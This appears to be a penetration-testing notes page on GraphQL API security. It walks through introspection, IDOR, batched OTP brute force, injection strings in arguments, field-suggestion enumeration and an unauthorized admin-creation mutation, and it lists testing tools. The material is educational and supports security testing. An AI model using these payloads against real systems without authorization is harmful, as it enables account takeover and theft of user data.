# GraphQL Security

← [[A03-Injection]]

---

GraphQL is an API query language that lets clients request exactly the data they need. It's increasingly common and has its own unique attack surface that differs from REST APIs.

---

## GraphQL vs REST

| | REST | GraphQL |
|--|------|---------|
| Endpoints | Many (`/users`, `/posts`, `/comments`) | One (`/graphql`) |
| Data shaping | Server-defined | Client-defined |
| Introspection | No standard | Built-in — exposes full schema |
| Auth | Per-endpoint | Often per-field or per-resolver |

The single endpoint means a single place to test everything. Introspection means you get the full API spec for free.

---

## Step 1 — Find GraphQL

```
/graphql
/api/graphql
/graphiql           ← in-browser GraphQL IDE (should be disabled in prod)
/api/v1/graphql
/query
```

Detect it: POST a query body, look for GraphQL-style errors:

```json
{"query": "{ __typename }"}
```

Response: `{"data": {"__typename": "Query"}}` → GraphQL confirmed.

---

## Step 2 — Introspection

Introspection reveals the entire schema — all types, queries, mutations, and their fields.

```graphql
{
  __schema {
    queryType { name }
    mutationType { name }
    types {
      name
      fields {
        name
        type { name kind }
        args { name type { name kind } }
      }
    }
  }
}
```

In Burp:
```
POST /graphql
Content-Type: application/json

{"query":"{\n  __schema{\n    queryType { name }\n    types{\n      name\n      fields{\n        name\n        args{ name }\n      }\n    }\n  }\n}"}
```

Or use **InQL** (Burp extension) — automatically runs introspection and presents the schema.

> [!NOTE]
> If introspection is disabled, try:
> - `__type(name: "User")` — partial introspection sometimes still works
> - Clairvoyance tool — recovers schema from error messages without introspection

---

## Step 3 — Identify Interesting Operations

From the schema, look for:

```
Queries:    getUser(id: ID), listUsers, adminStats, exportData
Mutations:  updateUser, deleteUser, changePassword, createAdmin
```

Pay attention to:
- Anything with `admin` in the name
- Operations that take an `id` parameter (IDOR)
- Operations for sensitive data (payments, PII)

---

## Attack 1 — IDOR via GraphQL

GraphQL queries often take object IDs directly:

```graphql
# Your own data:
query { user(id: "me") { email phone address } }

# Another user's data:
query { user(id: "123") { email phone address } }
```

Test by changing the ID. Access control must be implemented at the resolver level — if it's not, you have IDOR.

---

## Attack 2 — Batch Queries (Brute Force)

GraphQL allows multiple operations in one request. No rate limiting on the endpoint doesn't help if you can send 100 queries in one request.

```graphql
# Brute-force OTP in a single request (if rate limiting is per-request, not per-query)
mutation {
  verifyOTP1: verifyOTP(code: "000001") { success }
  verifyOTP2: verifyOTP(code: "000002") { success }
  verifyOTP3: verifyOTP(code: "000003") { success }
  ...
  verifyOTP9999: verifyOTP(code: "009999") { success }
}
```

---

## Attack 3 — Introspection in Production

If introspection is enabled in production, the full schema is exposed — including internal admin queries, PII fields, and internal service structure that developers assumed was hidden.

Finding: **Introspection enabled in production** — document what sensitive schema information is exposed.

---

## Attack 4 — Injection via Arguments

GraphQL arguments are passed to resolvers. If not sanitized:

```graphql
# NoSQL injection
{ user(id: "{\"$gt\": \"\"}") { email } }

# SQLi via string argument
{ search(term: "' OR '1'='1") { results } }
```

Test GraphQL arguments the same way you'd test REST parameters.

---

## Attack 5 — Field Suggestions (Information Leakage)

When introspection is disabled, GraphQL often still returns "did you mean X?" suggestions for typos. These leak field names:

```graphql
{ usrr { id } }
# Error: "Cannot query field 'usrr'. Did you mean 'user'?"

{ user { passwrd } }
# Error: "Cannot query field 'passwrd'. Did you mean 'password'?"
```

Enumerate field names through typo-based suggestions.

---

## Attack 6 — Mutations Without Authorization

```graphql
# Can a regular user run admin mutations?
mutation {
  deleteUser(id: "victim_id") { success }
  createAdmin(email: "attacker@evil.com", password: "hacked") { id }
  banUser(id: "target") { success }
}
```

---

## Tools

```bash
# InQL — Burp extension for GraphQL testing
# Automatically runs introspection, generates sample queries

# graphw00f — detect GraphQL engine fingerprinting
python3 graphw00f.py -t https://example.com/graphql

# Clairvoyance — schema recovery when introspection disabled
python3 clairvoyance.py -u https://example.com/graphql -o schema.json
```

---

## Quick GraphQL Test Checklist

- [ ] Introspection enabled in production?
- [ ] Query all sensitive operations (admin, payment, PII)
- [ ] IDOR on any ID parameter?
- [ ] Rate limiting on mutations (batch attack)?
- [ ] Auth required for all mutations?
- [ ] Error messages leak schema when introspection disabled?
- [ ] Injection via arguments?

---

*Related: [[IDOR]] | [[A03-Injection]] | [[A01-Broken-Access-Control]]*

*Sources: PortSwigger Web Security Academy, HowToHunt, OWASP GraphQL Cheat Sheet*
